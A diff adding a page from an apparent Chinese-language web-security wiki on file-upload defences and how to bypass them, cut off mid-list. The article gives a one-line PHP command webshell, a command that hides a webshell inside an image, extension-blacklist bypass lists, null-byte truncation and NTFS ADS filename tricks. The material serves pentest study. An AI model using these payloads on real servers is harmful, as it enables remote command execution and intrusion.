@@ -1,0 +1,2413 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.0.6">
+    
+    
+      
+        <title>File Processing - knowledge_wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.451f80e5.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#757575">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="grey" data-md-color-accent="brown">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#38" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="knowledge_wiki" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                knowledge_wiki
+              </span>
+              <span class="md-header-nav__topic">
+                File Processing
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="knowledge_wiki" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    knowledge_wiki
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Home" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Web security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Web security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../01introduce/" title="Security Basic" class="md-nav__link">
+      Security Basic
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02information_gathering/" title="information gathering" class="md-nav__link">
+      information gathering
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../03Web_Security_protocol/" title="Web Security protocol" class="md-nav__link">
+      Web Security protocol
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../04SQL_Injection/" title="SQL Injection" class="md-nav__link">
+      SQL Injection
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../05xxe/" title="xxe" class="md-nav__link">
+      xxe
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../06Code_Injection/" title="Code Injection" class="md-nav__link">
+      Code Injection
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../07Command_execute/" title="Command execute" class="md-nav__link">
+      Command execute
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../08Variable_Coverage/" title="Variable Coverage" class="md-nav__link">
+      Variable Coverage
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../09XSS/" title="XSS" class="md-nav__link">
+      XSS
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../10CSRF/" title="CSRF" class="md-nav__link">
+      CSRF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        File Processing
+      </label>
+    
+    <a href="./" title="File Processing" class="md-nav__link md-nav__link--active">
+      File Processing
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1" title="1）文件上传" class="md-nav__link">
+    1）文件上传
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#javascript" title="客户端javascript校验（通常校验扩展名）" class="md-nav__link">
+    客户端javascript校验（通常校验扩展名）
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mime" title="检查MIME类型" class="md-nav__link">
+    检查MIME类型
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1_1" title="检查文件内容1" class="md-nav__link">
+    检查文件内容1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" title="检查文件内容2" class="md-nav__link">
+    检查文件内容2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getimagesize" title="检查文件内容getimagesize()" class="md-nav__link">
+    检查文件内容getimagesize()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-" title="检查文件后缀-黑名单" class="md-nav__link">
+    检查文件后缀-黑名单
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-_1" title="检查后缀漏洞代码-白名单" class="md-nav__link">
+    检查后缀漏洞代码-白名单
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_1" title="2）文件下载" class="md-nav__link">
+    2）文件下载
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="防御文件下载" class="md-nav__link">
+    防御文件下载
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="测试方法" class="md-nav__link">
+    测试方法
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../12Session_Management/" title="Session Management" class="md-nav__link">
+      Session Management
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../13Unvalidated_Redirects_and_Forwards/" title="Unvalidated Redirects and Forwards" class="md-nav__link">
+      Unvalidated Redirects and Forwards
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../14SSRF/" title="SSRF" class="md-nav__link">
+      SSRF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../15unserialize/" title="unserialize" class="md-nav__link">
+      unserialize
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../16Databases_Security/" title="Databases Security" class="md-nav__link">
+      Databases Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../17Operating_system_Security/" title="Operating system Security" class="md-nav__link">
+      Operating system Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../18Middleware_Security/" title="Middleware Security" class="md-nav__link">
+      Middleware Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../19Pentest_Cheat_Sheets/" title="Pentest Cheat Sheets" class="md-nav__link">
+      Pentest Cheat Sheets
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-20" type="checkbox" id="nav-2-20">
+    
+    <label class="md-nav__link" for="nav-2-20">
+      tools
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-20">
+        tools
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_common/" title="common" class="md-nav__link">
+      common
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_Nmap/" title="nmap" class="md-nav__link">
+      nmap
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_Burpsuite/" title="Burpsuite" class="md-nav__link">
+      Burpsuite
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_SQLMap/" title="SQLMap" class="md-nav__link">
+      SQLMap
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_Metasploit/" title="Metasploit" class="md-nav__link">
+      Metasploit
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Bug-Bounty
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Bug-Bounty
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Bug-Bounty/Bug-Bounty/" title="Bug-Bounty" class="md-nav__link">
+      Bug-Bounty
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Bug-Bounty/CTF/" title="CTF" class="md-nav__link">
+      CTF
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Research on program vulnerabilities
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Research on program vulnerabilities
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/攻击类漏洞利用/" title="漏洞利用" class="md-nav__link">
+      漏洞利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/01PHP Security/" title="PHP Security" class="md-nav__link">
+      PHP Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/02Binary_Security/" title="Binary Security" class="md-nav__link">
+      Binary Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/03Malware_tech/" title="Malware analysis" class="md-nav__link">
+      Malware analysis
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/04Malware_Analysis_tech/" title="Malware analysis tech" class="md-nav__link">
+      Malware analysis tech
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Computer Forensics
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Computer Forensics
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/00APT上机检查思路/" title="Introduce" class="md-nav__link">
+      Introduce
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/01Windows执行痕迹搜集/" title="Windows执行痕迹搜集" class="md-nav__link">
+      Windows执行痕迹搜集
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/02流量分析/" title="流量分析" class="md-nav__link">
+      流量分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/03内存分析/" title="内存分析" class="md-nav__link">
+      内存分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/04入侵痕迹排查-Linux/" title="入侵痕迹排查-Linux" class="md-nav__link">
+      入侵痕迹排查-Linux
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/04入侵痕迹排查-Windows/" title="入侵痕迹排查-Windows" class="md-nav__link">
+      入侵痕迹排查-Windows
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/06入侵手法/" title="入侵手法" class="md-nav__link">
+      入侵手法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/05tools_common/" title="tools_commo" class="md-nav__link">
+      tools_commo
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../Information_Security_Engineer/" title="Information Security Engineer" class="md-nav__link">
+      Information Security Engineer
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      common
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        common
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/00_Programer_learn_Strategy/" title="程序员攻略" class="md-nav__link">
+      程序员攻略
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/01_Algrothm/" title="Algrothm" class="md-nav__link">
+      Algrothm
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
+    
+    <label class="md-nav__link" for="nav-7-3">
+      Python
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-7-3">
+        Python
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_1_python_基本语法/" title="基本语法" class="md-nav__link">
+      基本语法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_2_python_变量和数据类型/" title="变量和数据类型" class="md-nav__link">
+      变量和数据类型
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_3_python_流程控制/" title="流程控制" class="md-nav__link">
+      流程控制
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_4_python_函数及作用域/" title="函数及作用域" class="md-nav__link">
+      函数及作用域
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_5_python_数学/" title="数学函数" class="md-nav__link">
+      数学函数
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_6_python_字符串/" title="字符串" class="md-nav__link">
+      字符串
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_7_python_列表/" title="列表" class="md-nav__link">
+      列表
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_8_python_tuple/" title="tuple" class="md-nav__link">
+      tuple
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_9_python_字典/" title="字典" class="md-nav__link">
+      字典
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_10_python_集合/" title="集合" class="md-nav__link">
+      集合
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_11_python_文件操作/" title="文件操作" class="md-nav__link">
+      文件操作
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_12_python_os/" title="OS" class="md-nav__link">
+      OS
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_13_python_shutil/" title="shutil" class="md-nav__link">
+      shutil
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_14_python_zip压缩/" title="zip压缩" class="md-nav__link">
+      zip压缩
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_15_python_calendar日历/" title="calendar日历" class="md-nav__link">
+      calendar日历
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_16_python_time时间/" title="time时间" class="md-nav__link">
+      time时间
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_17_python_类和对象/" title="类和对象" class="md-nav__link">
+      类和对象
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_18_python_模块和包/" title="模块和包" class="md-nav__link">
+      模块和包
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_19_python_错误和异常处理/" title="错误和异常处理" class="md-nav__link">
+      错误和异常处理
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_20_python_tkinter/" title="tkinter" class="md-nav__link">
+      tkinter
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_21_python_性能/" title="性能" class="md-nav__link">
+      性能
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_22_python_多线程/" title="多线程" class="md-nav__link">
+      多线程
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-23" type="checkbox" id="nav-7-3-23">
+    
+    <label class="md-nav__link" for="nav-7-3-23">
+      Flask
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-7-3-23">
+        Flask
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Python_flask/1_URL和视图笔记/" title="URL和视图笔记" class="md-nav__link">
+      URL和视图笔记
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Python_flask/2_模板笔记/" title="模板" class="md-nav__link">
+      模板
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Python_flask/3_数据库/" title="数据库" class="md-nav__link">
+      数据库
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Python_flask/4_cookie和session笔记/" title="cookie和session笔记" class="md-nav__link">
+      cookie和session笔记
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/03_C_C++_Basic/" title="C_C++" class="md-nav__link">
+      C_C++
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/03_1_MFC/" title="C++_MFC" class="md-nav__link">
+      C++_MFC
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/04_Java_Book/" title="Java" class="md-nav__link">
+      Java
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Other-VBA语法/" title="VBA" class="md-nav__link">
+      VBA
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Other-Powersehll/" title="Powersehll" class="md-nav__link">
+      Powersehll
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../安全岗位面试/" title="面试" class="md-nav__link">
+      面试
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1" title="1）文件上传" class="md-nav__link">
+    1）文件上传
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#javascript" title="客户端javascript校验（通常校验扩展名）" class="md-nav__link">
+    客户端javascript校验（通常校验扩展名）
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mime" title="检查MIME类型" class="md-nav__link">
+    检查MIME类型
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1_1" title="检查文件内容1" class="md-nav__link">
+    检查文件内容1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" title="检查文件内容2" class="md-nav__link">
+    检查文件内容2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getimagesize" title="检查文件内容getimagesize()" class="md-nav__link">
+    检查文件内容getimagesize()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-" title="检查文件后缀-黑名单" class="md-nav__link">
+    检查文件后缀-黑名单
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-_1" title="检查后缀漏洞代码-白名单" class="md-nav__link">
+    检查后缀漏洞代码-白名单
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_1" title="2）文件下载" class="md-nav__link">
+    2）文件下载
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="防御文件下载" class="md-nav__link">
+    防御文件下载
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="测试方法" class="md-nav__link">
+    测试方法
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="38">3.8、文件处理</h1>
+<h2 id="1"><strong>1）文件上传</strong></h2>
+<p>一个正常的业务需求，问题在于控制上传合法文件。</p>
+<p><strong>防御文件上传</strong></p>
+<ul>
+<li>客户端javascript校验（通常校验扩展名）</li>
+<li>检查MIME类型</li>
+<li>检查内容是否合法</li>
+<li>随机文件名*</li>
+<li>检查文件扩展名*</li>
+<li>隐藏路径*</li>
+<li>重写内容（影响效率）imagecreatefromjpeg...</li>
+</ul>
+<p><strong>测试思路</strong></p>
+<ul>
+<li>客户端javascript校验：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包，抓包改包可绕过。直接修改前端也可以。</li>
+<li>
+<p>检测MIME类型：修改MIME类型为【image/jpeg】图片头的方式绕过。</p>
+</li>
+<li>
+<p>检查内容是否合法：</p>
+</li>
+<li>
+<ul>
+<li>绕过方法1：test.phtml文件</li>
+</ul>
+</li>
+</ul>
+<pre><code>  &lt;script language=&quot;php&quot;&gt;
+      phpinfo();
+  &lt;/script&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>绕过方法2：使用PHP输出表达式</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;?=system($_REQUEST['cmd']);?&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>绕过方法3：将一句话Webshell与图片合并起来，命令【copy 1.jpg/b + 1.asp/a 2.jpg】，生成的2.jpg就是webshell。</li>
+</ul>
+</li>
+<li>随机文件名*：受到业务需求限制，例如头像必须要被访问到。</li>
+<li>检查文件扩展名*：</li>
+<li>
+<ul>
+<li>黑名单绕过方法：使用不同的后缀名</li>
+</ul>
+</li>
+</ul>
+<pre><code>php php3、php5、phtml、PHP、pHp、phtm
+jsp jspx、jspf
+asp asa、cer、aspx
+exe exee
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>白名单绕过方法：</li>
+</ul>
+</li>
+</ul>
+<pre><code>•配合文件包含漏洞:
+•截断绕过:使用00截断后缀的方式，如test.php(0x00).jpg
+•利用NTFS ADS特性:对Linux无效。
+    上传的文件名  服务器表面现象    生成的文件内容 
+    Test.php:a.jpg     生成Test.php  空 
+    Test.php::$DATA  生成test.php  &lt;?php phpinfo();?&gt; 
+    Test.php::$INDEX_ALLOCATION  生成test.php文件夹   
+    Test.php::$DATA\0.jpg  生成0.jpg  &lt;?php phpinfo();?&gt; 
+    Test.php::$DATA\aaa.jpg  生成aaa.jpg  &lt;?php phpinfo();?&gt; 
+•配合服务器解析漏洞:
+- IIS5.X~6.X解析漏洞（xx.asp;.jpg）、asp.asp目录下放图片文件
+- WebDav PUT
+- Apache解析漏洞
+- - 低版本Apache解析文件的规则是从右到左开始判断解析。
